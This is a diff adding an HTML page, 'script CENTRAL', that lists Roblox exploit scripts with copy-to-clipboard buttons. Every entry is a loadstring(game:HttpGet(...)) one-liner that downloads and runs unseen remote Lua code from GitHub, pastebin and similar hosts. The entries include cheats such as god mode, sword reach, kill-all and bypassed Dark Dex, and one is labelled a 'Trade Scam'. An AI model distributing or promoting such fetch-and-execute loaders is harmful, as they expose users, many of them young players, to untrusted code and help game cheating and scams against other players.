@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0a;min-height:100vh;font-family:system-ui;display:flex;flex-direction:column;background:linear-gradient(45deg,#0a0a0a,#111)}
+.container{padding:2rem;background:linear-gradient(90deg,#111,#151515);border-bottom:1px solid #222;box-shadow:0 2px 15px rgba(0,0,0,.3);position:relative;overflow:hidden}
+.container::after{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,#ff0,#0ff,#f0f);animation:rainbow 2s linear infinite}
+@keyframes rainbow{0%{background-position:0% 50%}100%{background-position:100% 50%}}
+h1{font-size:2.5em;color:#f0f0f0;letter-spacing:2px;font-weight:800;text-shadow:0 0 10px rgba(255,255,255,.2)}
+.version{color:#666;margin-top:.5em;font-size:.9em}
+#content{padding:2rem;flex:1;max-width:800px;margin:0 auto;width:100%}
+.script-title{color:#888;font-size:1.2em;margin-bottom:.5em;display:flex;align-items:center;gap:5px}
+.script-title::before{content:'🔥'}
+.script-name{color:#f0f0f0;font-size:1.4em;margin-bottom:1em;width:100%;overflow:hidden;text-overflow:ellipsis}
+.code-container{position:relative;background:#151515;padding:1.5rem;border-radius:8px;border:1px solid #333;box-shadow:0 0 20px rgba(0,255,136,.1)}
+code{display:block;color:#00ff88;font-family:monospace;margin-top:1rem;text-shadow:0 0 5px rgba(0,255,136,.3);word-wrap:break-word}
+.copy-btn{position:absolute;right:10px;top:10px;background:#222;color:#fff;border:1px solid #444;padding:8px 15px;border-radius:3px;cursor:pointer;transition:all .2s}
+.copy-btn:hover{background:#333;transform:translateY(-2px)}
+.nav-bar{position:fixed;bottom:0;width:100%;background:linear-gradient(90deg,#111,#151515);padding:1rem;display:flex;justify-content:center;gap:2rem;border-top:1px solid #222}
+.nav-btn{color:#fff;text-decoration:none;display:flex;align-items:center;gap:5px;padding:8px 15px;border-radius:5px;transition:all .2s;background:rgba(255,255,255,.05);cursor:pointer}
+.nav-btn:hover{background:rgba(255,255,255,.1);transform:translateY(-2px)}
+.script-card{background:#151515;padding:1.5rem;border-radius:8px;border:1px solid #333;margin-bottom:1rem;transition:all .3s}
+.script-card:hover{transform:translateY(-5px);box-shadow:0 5px 15px rgba(0,255,136,.2)}
+.search-bar{width:100%;padding:1rem;background:#151515;border:1px solid #333;border-radius:8px;color:#fff;margin-bottom:2rem;font-size:1em;transition:all .3s}
+.search-bar:focus{outline:none;border-color:#00ff88;box-shadow:0 0 15px rgba(0,255,136,.1)}
+</style>
+<script>
+const scripts=[{name:"Pop It Trading Trade Scam",code:"loadstring(game:HttpGet(('https://raw.githubusercontent.com/RTHRTHTH3R34/POP-IT-TRADING-GO/main/README.md'),true))()"},{name:"Infinite Yield",code:"loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()"},{name:"Anti-Afk",code:"loadstring(game:HttpGet(\"https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz\", true))()"},{name:"Pet Simulator 99 Stairway",code:"loadstring(game:HttpGet('https://raw.githubusercontent.com/fissurectomy/woah/main/ps99_stairway.lua'))()"},{name:"Blade Ball",code:"loadstring(game:HttpGet(\"https://raw.githubusercontent.com/iminreality/Roblox_Script/refs/heads/main/Blade_Ball.lua\"))()"},{name:"BedWars",code:"loadstring(game:HttpGet(\"https://pastebin.com/raw/C45F8Tpk\"))()"},{name:"Big Paintball 2",code:"loadstring(game:HttpGet(\"https://raw.githubusercontent.com/xxxloilpxxx/lol/main/bigpenisball2-killall.lua\"))()"},{name:"Pls Donate",code:"loadstring(game:HttpGet(\"https://raw.githubusercontent.com/CF-Trail/tzechco-PlsDonateAutofarmBackup/main/autofarm\"))()"},{name:"Best Trolling Gui 300+ Scripts",code:"loadstring(game:HttpGet(\"https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau\"))()"},{name:"Sword Reach",code:"loadstring(game:HttpGet('https://pastebin.com/raw/0dnNLQgG'))()"},{name:"Dark Dex V3",code:"loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua\", true))()"},{name:"DOORS",code:"loadstring(game:HttpGet(\"https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua\"))()"},{name:"Death Ball",code:"loadstring(game:HttpGet(\"https://api.luarmor.net/files/v3/loaders/e9aa36da0de00de261431898fc324aa5.lua\"))()"},{name:"Juke's Towers of Hell",code:"loadstring(game:HttpGet(\"https://rawscripts.net/raw/100M-LEGACY-Juke's-Towers-of-Hell-WIN-EVERYTHING-17191\"))()"},{name:"City Defense Tycoon",code:"loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ZenHub103/Zen-Hub-/refs/heads/main/Zen%20Hubs\"))()"},{name:"GhostHub",code:"loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()"},{name:"Islands Autofarm",code:"loadstring(game:HttpGet('https://raw.githubusercontent.com/pascaldercoole1/Open-Source-Scripts/main/FreeIslands'))()"},{name:"Fisch Instant Autofarm",code:"loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\", true))()"},{name:"Get All Gamepasses/Dev Products",code:"loadstring(game:HttpGet(('https://raw.githubusercontent.com/BaconBossScript/Crazy/main/Crazy'),true))()"},{name:"God Mode",code:"loadstring(game:HttpGet(\"https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main\",true))()"}];
+function copyCode(code){navigator.clipboard.writeText(code);const b=event.target;b.textContent='✨ Copied!';setTimeout(()=>b.textContent='📋 Copy',2000)}
+function filterScripts(query){return scripts.filter(s=>s.name.toLowerCase().includes(query.toLowerCase()))}
+function displayScripts(filtered=scripts){return filtered.map(s=>`<div class="script-card"><div class="script-name">${s.name}</div><div class="code-container"><code>${s.code}</code><button class="copy-btn" onclick="copyCode('${s.code}')">📋 Copy</button></div></div>`).join('')}
+function loadContent(page){const content=document.getElementById('content');if(page==='home')content.innerHTML=`<div class="script-title">TRY OUT THIS SCRIPT</div><div class="script-name">Infinite Yield</div><div class="code-container"><code>${scripts[1].code}</code><button class="copy-btn" onclick="copyCode('${scripts[1].code}')">📋 Copy</button></div>`;if(page==='library')content.innerHTML=`<input type="text" class="search-bar" placeholder="🔍 Search scripts..." oninput="this.nextElementSibling.innerHTML=displayScripts(filterScripts(this.value))"><div class="scripts-container">${displayScripts()}</div>`;if(page==='events')content.innerHTML=''}
+</script>
+</head>
+<body>
+<div class="container"><h1>script CENTRAL</h1><p class="version">v1.0.5 ⋅ discord.gg/akRgpe6Gkg</p></div>
+<div id="content">
+<div class="script-title">TRY OUT THIS SCRIPT</div>
+<div class="script-name">Infinite Yield</div>
+<div class="code-container">
+<code>loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()</code>
+<button class="copy-btn" onclick="copyCode(scripts[1].code)">📋 Copy</button>
+</div>
+</div>
+<div class="nav-bar">
+<a onclick="loadContent('home')" class="nav-btn">🏠 Home</a>
+<a onclick="loadContent('events')" class="nav-btn">⭐ Events</a>
+<a onclick="loadContent('library')" class="nav-btn">📚 Script Library</a>
+</div>
+</body>
+</html>
